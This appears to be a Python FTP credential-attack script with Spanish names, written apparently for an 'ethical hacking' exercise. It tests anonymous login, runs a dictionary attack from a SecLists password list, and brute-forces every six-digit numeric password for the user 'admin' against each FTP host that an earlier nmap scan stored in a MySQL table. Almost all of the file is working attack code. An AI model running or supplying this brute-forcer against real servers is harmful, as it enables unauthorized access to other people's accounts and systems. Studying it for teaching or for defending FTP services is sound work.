from ftplib import FTP
import mysql.connector as mysql

def anonymous_conexion(host):
	conexion = True
	usuario = "anonymous"
	clave = ""
	aviso = "La conexion falló"
		

	try:
		tp = FTP(host, usuario, clave)
		conexion = False 
		    
	except:
		conexion = True 


	if not conexion:
		aviso = "Conexión establecida con exito"
		pass
	print ("\nip del servidor: "+ host)
	print ("usuario: "+usuario+" + Contraseña: "+clave+" = " + str(not conexion)+" :: "+aviso)

	

def atacar_usuariod(usuario, host):
	f = open("1000000-password-seclists.txt", "r")
	conexion = True
	
	clave = "135246113"
	while(conexion):

		linea = f.readline()
		aviso = "Falló la conexión!"
		
		clave = linea [0:(len(linea)-1)]

		try:
			tp = FTP(host, usuario, clave)
			conexion = False 
		    
		except:
		    conexion = True 


		if not conexion:
			aviso = "Conexión establecida con exito"
			pass
		print ("\nip: "+host+" :: usuario: "+usuario+" + contraseña: "+clave+" = " + str(not conexion)+" :: "+aviso)

		if not linea:
			break 

def atacar_usuario_fb(usuario, host):
	conexion = True
	
	
	n = 0 
	while(n <= 999999):

		aviso = "Falló de conexión"
		clave = str(n).zfill(6)
		print (clave)		

		try:
			tp = FTP(host, usuario, clave)
			conexion = False 
		except:
		    conexion = True 

		if not conexion:
			aviso = "Conexión establecida!!!"
			pass
		print ("\nip: "+host+": usuario: "+usuario+" + contraseña: "+clave+" = " + str(not conexion)+" :: "+aviso)
		n = n + 1
		if not conexion:
			break 


host = "127.0.0.1"
usuario = "josue"

conexion = mysql.connect( host='localhost', user= 'root', passwd='', db='hacking_etico' )
ope_con = conexion.cursor()
ope_con.execute( "SELECT * FROM nmap WHERE servicio = 'ftp' ; " )
result_set = ope_con.fetchall()

for row in result_set:
    atacar_usuario_fb("admin",row[0])
